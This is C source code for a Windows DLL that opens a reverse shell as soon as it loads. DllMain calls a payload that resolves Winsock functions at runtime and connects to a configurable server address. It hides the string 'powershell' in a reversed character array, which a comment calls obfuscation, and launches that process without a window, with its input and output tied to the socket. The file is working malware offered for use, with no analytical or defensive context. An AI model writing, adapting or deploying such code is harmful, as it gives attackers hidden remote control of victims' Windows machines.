#include <processthreadsapi.h>
#include <memoryapi.h>
#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib,"ws2_32")
#include <windows.h>

#include <io.h>
#include <process.h>
#include <sys/types.h>
#include <stdlib.h>
#include <string.h>

typedef int(WSAAPI* WSASTARTUP)(WORD wVersionRequested,LPWSADATA lpWSAData);
typedef SOCKET(WSAAPI* WSASOCKETA)(int af,int type,int protocol,LPWSAPROTOCOL_INFOA lpProtocolInfo,GROUP g,DWORD dwFlags);
typedef unsigned(WSAAPI* INET_ADDR)(const char *cp);
typedef u_short(WSAAPI* HTONS)(u_short hostshort);
typedef int(WSAAPI* WSACONNECT)(SOCKET s,const struct sockaddr *name,int namelen,LPWSABUF lpCallerData,LPWSABUF lpCalleeData,LPQOS lpSQOS,LPQOS lpGQOS);


int Payload()
{
	HMODULE hws2_32 = LoadLibraryW(L"ws2_32");
	WSASTARTUP myWSAStartup = (WSASTARTUP) GetProcAddress(hws2_32, "WSAStartup");

	// configure here the server address and port
	char *server_IP = "127.0.0.1";
	int server_port = 1234;

	
	WSADATA wsaData;
	if (myWSAStartup(MAKEWORD(2 ,2), &wsaData) != 0) {
		printf("-->Error: WSASturtup failed.\n");
		return 1;
	}

	WSASOCKETA myWSASocketA = (WSASOCKETA) GetProcAddress(hws2_32, "WSASocketA");
	INET_ADDR myinet_addr = (INET_ADDR) GetProcAddress(hws2_32, "inet_addr");
	HTONS myhtons = (HTONS) GetProcAddress(hws2_32, "htons");


	int port = server_port;
	struct sockaddr_in malsa;
	SOCKET mysock = myWSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	malsa.sin_family = AF_INET;
	malsa.sin_port = myhtons(port);
	malsa.sin_addr.s_addr = myinet_addr(server_IP);

	
	if (connect(mysock, (struct sockaddr *) &malsa, sizeof(malsa)) != 0) {
		printf("--> ERROR: Connection failed.\n");
		return 1;
	}

	//obfuscate a bit ______________________________________________
	char arr_pot[] = {'\0','l','l','e','h','s','r','e','w','o','p'};
	// if you want you go classic
	//char arr_pot[] = {'\0','e','x','e','.','d','m','c'};
	char tmp; int i, j; 
	int length = sizeof(arr_pot) / sizeof(arr_pot[0]);
	
	for (i = 0, j = (length - 1); i < j; i++, j--) { // loop to swap elements
        tmp = arr_pot[i];
        arr_pot[i] = arr_pot[j];
        arr_pot[j] = tmp;
    }

	// printf(" %s\n", arr_pot);
	

	STARTUPINFO sinfo;
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.cb = sizeof(sinfo);
	sinfo.dwFlags = (STARTF_USESTDHANDLES);
	sinfo.hStdInput = (HANDLE) mysock;
	sinfo.hStdOutput = (HANDLE) mysock;
	sinfo.hStdError = (HANDLE) mysock;
	PROCESS_INFORMATION pinfo;
	
	CreateProcessA(NULL, arr_pot, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);

	return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
  switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
      Payload();
      break;
    case DLL_THREAD_ATTACH:
      break;
    case DLL_THREAD_DETACH:
      break;
    case DLL_PROCESS_DETACH:
      break;
    }
  return TRUE;
}